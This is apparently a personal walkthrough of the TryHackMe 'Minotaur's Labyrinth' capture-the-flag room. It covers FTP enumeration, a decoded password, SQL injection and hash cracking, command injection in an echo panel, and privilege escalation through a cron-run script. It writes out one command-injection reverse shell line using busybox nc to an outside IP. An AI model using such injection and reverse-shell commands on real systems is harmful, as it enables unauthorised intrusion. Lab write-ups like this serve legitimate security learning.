# Minotaur's Labyrinth CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Minotaur's Labyrinth** CTF challenge on [TryHackMe](https://tryhackme.com/room/labyrinth8llv). 
---

after scanning we see open ports: 21, 80, 443, 3306

![scn](imgs/scn.png "scn")

in ftp I managed to get 3 hidden files including one flag, we also have few notes saying to look around

![ftp1](imgs/ftp1.png "ftp1")

![ftp2](imgs/ftp2.png "ftp2")

by looking at the web site on port 80 we see a login page

![l](imgs/l.png "l")

we can also find /js/login.js with some comments, if we take a look we see coded password for user Daedalus, we can decode it to get his password and login to user panel

![cm](imgs/cm.png "cm")

![p](imgs/p.png "p")

we see some comment in panel source 

![c](imgs/c.png "c")

there is also /js/userlvl.js

![lvl](imgs/lvl.png "lvl")

by using simple SQLi we can get diffrent passwords

![sqli1](imgs/sqli1.png "sqli1")

by using crackstation we found a few plain text passwords

![crack1](imgs/crack1.png "crack1")

we can do the same for `creatures` table

![sqli2](imgs/sqli2.png "sqli2")

![crack2](imgs/crack2.png "crack2")

now we can try to login as those users, most interesting user is M!n0taur because we see other panel and additional info and another flag

![adm](imgs/adm.png "adm")

we found secret echo-panel

![e](imgs/e.png "e")

if we input: `test` we will get the same output, but if we try: `" id;` we see some error message

![er](imgs/er.png "er")

few methods seem to work, we can use `` `id` `` or `test | id`

![id](imgs/id.png "id")

we can use this command to gain reverse shell as deamon

```
test | busybox nc 10.14.91.59 8888 -e /bin/bash
```

![rs](imgs/rs.png "rs")

now we can grab user flag

![rss](imgs/rss.png "rss")

![user](imgs/user.png "user")

linpeas found `/timers/timer.sh` and it seems odd and i remember that one note from ftp mentioned something about timer

![lin](imgs/lin.png "lin")

the script mentions `/reminders/dontforget.txt`

![pr](imgs/pr.png "pr")

![sc](imgs/sc.png "sc")

we can see in pspy64 that the script is executed every minute

![pspy](imgs/pspy.png "pspy")

i added reverse shell inside /timers/timer.sh

![rs2](imgs/rs2.png "rs2")

now we have root access and root flag

![root](imgs/root.png "root")

# MACHINE PWNED
